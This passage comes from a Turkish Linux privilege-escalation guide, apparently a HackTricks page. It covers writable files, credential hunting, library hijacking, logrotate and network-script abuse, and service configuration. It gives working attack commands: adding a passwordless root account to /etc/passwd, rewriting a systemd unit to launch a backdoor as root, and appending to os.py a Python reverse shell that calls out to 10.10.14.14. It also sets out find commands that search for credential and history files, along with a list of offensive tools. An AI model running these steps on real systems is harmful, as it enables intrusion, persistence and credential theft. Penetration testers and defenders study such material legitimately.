```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz.

Alternatif olarak, şifre olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: mevcut makinenin güvenliğini azaltabilirsiniz.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd` konumundadır, ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı **hassas dosyalara yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, bazı **hizmet yapılandırma dosyalarına** yazabilir misiniz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, eğer makine bir **tomcat** sunucusu çalıştırıyorsa ve **/etc/systemd/ içindeki Tomcat hizmet yapılandırma dosyasını değiştirebiliyorsanız,** o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Arka kapınız, tomcat bir sonraki kez başlatıldığında çalıştırılacaktır.

### Klasörleri Kontrol Et

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Sonuncusunu okumakta zorlanabilirsiniz ama deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Garip Konum/Sahip Olunan Dosyalar
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son Dakikada Değiştirilen Dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH'teki Script/Binary'ler**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedeklemeler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bilinen şifre içeren dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu okuyun, **şifre içerebilecek birkaç olası dosyayı** arar.\
**Bunu yapmak için kullanabileceğiniz başka bir ilginç araç**: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), Windows, Linux ve Mac için yerel bir bilgisayarda saklanan birçok şifreyi almak için kullanılan açık kaynaklı bir uygulamadır.

### Loglar

Logları okuyabiliyorsanız, **içlerinde ilginç/gizli bilgiler bulabilirsiniz**. Log ne kadar garip olursa, o kadar ilginç olacaktır (muhtemelen).\
Ayrıca, bazı "**kötü**" yapılandırılmış (arka kapılı?) **denetim logları**, bu yazıda açıklandığı gibi, denetim logları içinde **şifreleri kaydetmenize** izin verebilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**Logları okumak için grup** [**adm**](interesting-groups-linux-pe/index.html#adm-group) gerçekten faydalı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Genel Kimlik Bilgileri Arama/Regex

Ayrıca, **adında** veya **içeriğinde** "**password**" kelimesini içeren dosyaları kontrol etmeli ve günlüklerde IP'ler ve e-postalar ile hash regex'lerini de kontrol etmelisiniz.\
Bunların nasıl yapılacağını burada listelemeyeceğim ama ilgileniyorsanız, [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri kontrol edebilirsiniz.

## Yazılabilir dosyalar

### Python kütüphanesi ele geçirme

Bir python scriptinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabiliyorsanız** veya **python kütüphanelerini değiştirebiliyorsanız**, OS kütüphanesini değiştirebilir ve arka kapı ekleyebilirsiniz (python scriptinin çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).

Kütüphaneyi **arka kapılamak** için os.py kütüphanesinin sonuna aşağıdaki satırı ekleyin (IP ve PORT'u değiştirin):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate istismarı

`logrotate`'deki bir güvenlik açığı, bir günlük dosyası veya onun üst dizinlerinde **yazma izinlerine** sahip kullanıcıların potansiyel olarak yükseltilmiş ayrıcalıklar kazanmasına olanak tanır. Bunun nedeni, genellikle **root** olarak çalışan `logrotate`'in, özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde rastgele dosyaları çalıştıracak şekilde manipüle edilebilmesidir. Günlük döngüsünün uygulandığı _/var/log_ dizininde değil, aynı zamanda diğer dizinlerde de izinleri kontrol etmek önemlidir.

> [!TIP]
> Bu güvenlik açığı `logrotate` sürüm `3.18.0` ve daha eski sürümleri etkilemektedir.

Güvenlik açığı hakkında daha ayrıntılı bilgi bu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu güvenlik açığını [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu güvenlik açığı, [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx günlükleri)** ile çok benzerlik göstermektedir, bu nedenle günlükleri değiştirebildiğinizi bulduğunuzda, bu günlükleri yöneten kişiyi kontrol edin ve günlükleri simlinklerle değiştirerek ayrıcalıkları yükseltip yükseltemeyeceğinizi kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Güvenlik açığı referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Herhangi bir nedenle, bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine **yazabilirse** veya mevcut birini **ayarlayabilirse**, o zaman **sisteminiz ele geçirilmiştir**.

Ağ betikleri, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. Tam olarak .INI dosyaları gibi görünürler. Ancak, Linux'ta Network Manager (dispatcher.d) tarafından \~sourced\~ edilirler.

Benim durumumda, bu ağ betiklerinde `NAME=` ataması doğru bir şekilde işlenmemektedir. Eğer isimde **boşluk varsa, sistem boşluktan sonraki kısmı çalıştırmaya çalışır**. Bu, **ilk boşluktan sonraki her şey root olarak çalıştırılır** anlamına gelir.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd ve rc.d**

Dizin `/etc/init.d`, **System V init (SysVinit)** için **script'lerin** bulunduğu yerdir, bu da **klasik Linux servis yönetim sistemi**dir. Bu script'ler servisleri `başlatmak`, `durdurmak`, `yeniden başlatmak` ve bazen `reload` etmek için kullanılır. Bunlar doğrudan veya `/etc/rc?.d/` dizininde bulunan sembolik bağlantılar aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif bir yol `/etc/rc.d/init.d`'dir.

Diğer yandan, `/etc/init` **Upstart** ile ilişkilidir, bu da Ubuntu tarafından tanıtılan daha yeni bir **servis yönetimi** sistemidir ve servis yönetim görevleri için yapılandırma dosyaları kullanır. Upstart'a geçişe rağmen, SysVinit script'leri hala Upstart yapılandırmaları ile birlikte kullanılmaktadır çünkü Upstart'ta bir uyumluluk katmanı vardır.

**systemd**, talep üzerine daemon başlatma, otomatik montaj yönetimi ve sistem durumu anlık görüntüleri gibi gelişmiş özellikler sunan modern bir başlatma ve servis yöneticisi olarak ortaya çıkmaktadır. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` dizinlerine organize ederek sistem yönetim sürecini kolaylaştırır.

## Diğer Hileler

### NFS Yetki Yükseltme

{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kısıtlı Shell'lerden Kaçış

{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage

{{#ref}}
cisco-vmanage.md
{{#endref}}

## Kernel Güvenlik Koruma Önlemleri

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha Fazla Yardım

[Statik impacket ikili dosyaları](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Yetki Yükseltme Araçları

### **Linux yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t seçeneği)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Yetki Yükseltme Kontrolü:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Yetki Kontrol Aracı:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve MAC'teki kernel açıklarını listele [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Önerici:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fiziksel erişim):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Daha fazla script derlemesi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referanslar

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{{#include ../../banners/hacktricks-training.md}}
